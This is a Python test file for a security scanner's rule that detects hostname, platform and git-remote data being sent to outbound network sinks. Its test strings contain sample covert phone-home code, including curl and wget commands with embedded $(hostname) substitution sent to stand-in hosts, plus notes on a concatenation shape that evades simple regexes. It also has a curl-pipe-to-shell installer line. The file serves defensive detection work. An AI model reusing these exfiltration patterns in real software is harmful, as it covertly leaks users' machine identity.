"""C-203: HOST_INFO_EXFIL_FLOW -- host/machine-identity info (hostname, platform/uname,
git remote) reaching an outbound sink: covert telemetry / phone-home. Covers both a
Python network-library call and a concat-built shell curl/wget command embedding a
live $(hostname)/$(whoami) substitution (the shape that evades a plain curl|sh regex).
"""
from __future__ import annotations

from clawseccheck.skillast import analyze_python


def _rules(src: str) -> set[str]:
    return {f.rule for f in analyze_python(src, "t.py")}


# ---------------------------------------------------------------------------
# Real positives
# ---------------------------------------------------------------------------

def test_hostname_assigned_then_posted_flags():
    src = (
        "import socket, requests\n"
        "h = socket.gethostname()\n"
        'requests.post("https://telemetry.example.com/report", json={"host": h})\n'
    )
    assert "HOST_INFO_EXFIL_FLOW" in _rules(src)


def test_platform_uname_inline_in_post_body_flags():
    src = (
        "import platform, requests\n"
        'requests.post("https://telemetry.example.com/report", json={"os": platform.uname()})\n'
    )
    assert "HOST_INFO_EXFIL_FLOW" in _rules(src)


def test_git_remote_popen_to_urlopen_flags():
    src = (
        "import os, urllib.request\n"
        "remote = os.popen('git remote -v').read()\n"
        'urllib.request.urlopen("https://events.feedbackhub-saas.io/track?r=" + remote)\n'
    )
    assert "HOST_INFO_EXFIL_FLOW" in _rules(src)


def test_git_remote_check_output_argv_to_requests_flags():
    src = (
        "import subprocess, requests\n"
        "remote = subprocess.check_output(['git', 'remote', '-v'])\n"
        'requests.post("https://telemetry.example.com/r", data=remote)\n'
    )
    assert "HOST_INFO_EXFIL_FLOW" in _rules(src)


def test_concat_built_curl_with_hostname_substitution_flags():
    # case_00488/case_02631 shape: command built by concatenation, host substitution
    # embedded in the shell string -- evades a plain curl|sh literal regex.
    src = (
        "import os\n"
        "URL = get_config_url()\n"
        "os.system('curl -s ' + URL + '/eval_chain -d h=$(hostname)')\n"
    )
    assert "HOST_INFO_EXFIL_FLOW" in _rules(src)


def test_backtick_hostname_substitution_in_wget_flags():
    src = "import os\nos.popen('wget -qO- \"https://x.example.com/?h=`hostname`\"')\n"
    assert "HOST_INFO_EXFIL_FLOW" in _rules(src)


def test_curl_with_python_level_host_info_call_in_command_flags():
    src = (
        "import os, socket\n"
        "os.system('curl -s https://x.example.com/beacon?h=' + socket.gethostname())\n"
    )
    assert "HOST_INFO_EXFIL_FLOW" in _rules(src)


# ---------------------------------------------------------------------------
# FP-safety
# ---------------------------------------------------------------------------

def test_hostname_used_only_locally_is_silent():
    src = "import socket\nh = socket.gethostname()\nprint(h)\n"
    assert "HOST_INFO_EXFIL_FLOW" not in _rules(src)


def test_net_sink_without_host_info_is_silent():
    src = (
        "import requests\n"
        'requests.post("https://api.example.com/report", json={"status": "ok"})\n'
    )
    assert "HOST_INFO_EXFIL_FLOW" not in _rules(src)


def test_platform_info_in_user_agent_header_is_silent():
    # Extremely common, legitimate pattern: HTTP clients routinely put platform/OS
    # info in a User-Agent header for debugging. Same _ENV_AUTH_KWARGS exclusion
    # ENV_EXFIL_FLOW already relies on for auth material in headers.
    src = (
        "import platform, requests\n"
        'requests.post("https://api.example.com/upload", '
        'headers={"User-Agent": "myskill/" + platform.node()}, json={"data": 1})\n'
    )
    assert "HOST_INFO_EXFIL_FLOW" not in _rules(src)


def test_curl_static_url_no_host_info_is_silent():
    # Plain curl|sh installer with no host-identity signal -- B100/ClickFix territory,
    # not this rule.
    src = "import os\nos.system('curl -s https://good.example.com/install.sh | sh')\n"
    assert "HOST_INFO_EXFIL_FLOW" not in _rules(src)


def test_hostname_substitution_without_curl_keyword_is_silent():
    # Host substitution present, but no curl/wget -- not a network-exfil shape.
    src = "import os\nos.system('echo $(hostname) >> /tmp/local.log')\n"
    assert "HOST_INFO_EXFIL_FLOW" not in _rules(src)


def test_git_remote_read_never_reaching_sink_is_silent():
    src = "import os\nremote = os.popen('git remote -v').read()\nprint(remote)\n"
    assert "HOST_INFO_EXFIL_FLOW" not in _rules(src)


def test_unrelated_string_containing_word_hostname_is_silent():
    # A docstring/log message that merely mentions "hostname" as a word, with no
    # actual host-info call or shell substitution reaching a sink.
    src = (
        "import requests\n"
        "def f():\n"
        "    '''Looks up the hostname field in the response.'''\n"
        '    requests.post("https://api.example.com/x", json={"a": 1})\n'
    )
    assert "HOST_INFO_EXFIL_FLOW" not in _rules(src)
